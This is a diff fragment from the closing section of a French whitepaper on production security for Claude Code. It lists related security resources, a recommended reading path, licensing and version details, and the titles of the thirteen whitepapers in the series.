+| **mcpwn** | Scanner de sécurité pour serveurs MCP | [github.com/AgniveshChaubey/mcpwn](https://github.com/AgniveshChaubey/mcpwn) |
+| **Security Hardening Guide** | Guide dédié sécurité Claude Code (ce repo) | [guide/security/security-hardening.md](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/guide/security/security-hardening.md) |
+| **38 templates hooks** | Hooks de sécurité prêts à déployer | [examples/hooks/](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/tree/main/examples/hooks/) |
+
+## Parcours recommandé
+
+Selon votre niveau et votre besoin, les whitepapers complementaires de cette serie approfondissent les sujets connexes a la securite. Le whitepaper privacy couvre notamment le RGPD et la retention de donnees, souvent le premier sujet souleve par les equipes compliance.
+
+| Après ce whitepaper | Lire ensuite |
+|---------------------|--------------|
+| Débutant sécurité | → Voir **#0 De Zéro à Productif** (`00-introduction-serie.qmd`) |
+| Intégration CI/CD | → Voir **#5 Déployer en Équipe** (`05-equipe.qmd`) |
+| Compliance & RGPD | → Voir **#6 Privacy & Compliance** (`06-privacy.qmd`) |
+
+> 📖 **Pour aller plus loin :** [Security Hardening Guide](https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/guide/security/security-hardening.md) (guide dédié couvrant prévention, détection, réponse aux incidents)
+
+---
+
+| Type | Licence |
+|------|---------|
+| Contenu | CC BY-SA 4.0 |
+| Code | MIT |
+
+**Repository** : [github.com/FlorianBruniaux/claude-code-ultimate-guide](https://github.com/FlorianBruniaux/claude-code-ultimate-guide)
+
+*Version 3.43.0 | Septembre 2026*
+
+
+---
+
+{{< include fiches/fiche-03-securite.qmd >}}
+
+# La Série
+
+Ce livre blanc fait partie de la série **Claude Code Ultimate Guide**, une ressource complète pour maîtriser Claude Code, de l'installation au déploiement en production.
+
+**13 livres blancs dans la série :**
+
+- **WP00** Introduction & Fondamentaux
+- **WP01** Prompts Efficaces
+- **WP02** Personnalisation & Configuration
+- **WP03** Sécurité en Production
+- **WP04** Architecture Interne
+- **WP05** Adoption en Équipe
+- **WP06** Privacy & Conformité
+- **WP07** Guide de Référence Condensé
+- **WP08** Teams d'Agents & Sub-Agents
+- **WP09** Apprendre avec l'IA (UVAL)
+- **WP10** Budget IA & ROI
+- **WP11** Piloter une Équipe à l'Ère de l'IA
+- **WP12** Ingénierie à l’Ère des Agents Autonomes
+
+Série complète disponible sur [cc.bruniaux.com/whitepapers/](https://cc.bruniaux.com/whitepapers/)
